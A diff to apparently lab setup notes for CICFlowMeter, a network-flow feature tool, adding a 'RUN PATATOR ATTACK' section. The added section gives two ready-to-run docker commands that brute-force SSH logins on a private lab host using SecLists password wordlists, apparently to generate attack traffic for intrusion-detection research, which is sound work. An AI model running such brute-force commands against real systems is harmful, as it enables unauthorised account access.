@@ -57,4 +57,10 @@ CONFIGURATION FOR CICFLOWMETER as of 17th April 2022:
 5 - Build the code ececuting the following command in the cicflowmeter directory:
     python setup.py install
 
+RUN PATATOR ATTACK:
+
+sudo docker run --name patatorcontainer -it --rm -v $PWD/SecLists/Passwords:/mnt patator ssh_login host=192.168.30.6 user=ubuntu password=FILE0 0=/mnt/probable-v2-top12000.txt
+
+sudo docker run --name patatorcontainer -it --rm -v $PWD/SecLists/Passwords:/mnt patator ssh_login host=192.168.30.6 user=ubuntu password=FILE0 0=/mnt/2020-200_most_used_passwords.txt
+
 
